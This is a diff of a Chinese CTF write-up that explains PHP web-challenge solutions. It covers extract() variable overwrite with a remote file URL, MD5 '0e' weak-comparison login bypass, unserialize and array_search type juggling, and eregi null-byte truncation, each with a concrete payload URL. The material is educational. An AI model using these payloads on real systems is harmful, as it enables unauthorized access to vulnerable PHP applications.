@@ -104,25 +104,29 @@ print res1.content
 ```
 extract()函数造成变量覆盖导致$gift,$flag可以通过get传入值覆盖，file_get_contents()函数支持http协议远程读取文件，所以在vps上构造1.txt内容123，最终payload：
 
-> 202.120.7.221:2333/index.php?gift=123&flag=http://xxxxxx/1.txt (vps地址)
+> 202.120.7.221:2333/index.php?gift=123&#38;flag=http://xxxxxx/1.txt (vps地址)
 
 # 0x06 不是管理员也能login
 说明与帮助中给出代码：
 ```php
+<?
 $test=$_GET['userid']; $test=md5($test);
    if($test != '0'){
        $this->error('用户名有误,请阅读说明与帮助！');
     }
+?>
 ```
 用户名Md5值要等于0,这道题考点是php弱类型比较，让用户名Md5值格式为0e?????即可，科学技术法0的无论多少次方还是为0,构造用户名为：**QNKCDZO**，md5值0e830400451993494058024219903391
 右键源码：
 ```php
+<?
 $pwd =$this->_post("password");
 $data_u = unserialize($pwd);
 if($data_u['name'] == 'XX' && $data_u['pwd']=='XX')
     {
       print_r($flag);
     }
+?>
 ```
 将输入的密码反序列化，从条件看出，反序列化后需要是数组，键名name的键值要为一个未知的字符串，键名pwd的键值也要为未知的字符串，0和字符串双等弱比较会返回true还是考察弱比较，构造password：
 ```php
@@ -188,6 +192,6 @@ if($v1 && $v2 && $v3){
 先看最后，需要v1 v2 v3都为真才能echo出flag，需要传入一串序列化字串，反序列化后param1对应键值在is_numeric时如果传入的是字符串会先intval()，为数字就退出，不为数字即可，然后param1对应键值只要大于2017即可使v1=1，这里给param1赋值2018e即可
 param2键值需要为数组，数组元素等于5，第一个数组首位元素也要为数组，然后是array_search()，在数组搜索字符串，并返回对应键名，这里又是考察弱比较，"nudt"在和整形变量比较时会先被intval()强制转换，也就是intval("nudt") == 0，所以通过与整形变量比较来绕过，即可使v2值为1
 然后是strcmp，传入数组即可返回false，eregi函数用00截断绕过，最后可以即可使v3值为1,具体payload如下：
-> index.php?foo=a:2:{s:6:"param1";s:5:"2018e";s:6:"param2";a:5:{i:0;a:1:{i:0;i:1;}i:1;i:0;i:2;i:2;i:3;i:3;i:4;i:4;}}&egg[1][]=1111&fish=1&egg[0]=%00MyAns
+> index.php?foo=a:2:{s:6:"param1";s:5:"2018e";s:6:"param2";a:5:{i:0;a:1:{i:0;i:1;}i:1;i:0;i:2;i:2;i:3;i:3;i:4;i:4;}}&#38;egg[1][]=1111&#38;fish=1&#38;egg[0]=%00MyAns
 
 ![](https://github.com/c1h3ng/c1h3ng.github.io/blob/master/assets/images/bypasspayload.png?raw=true)
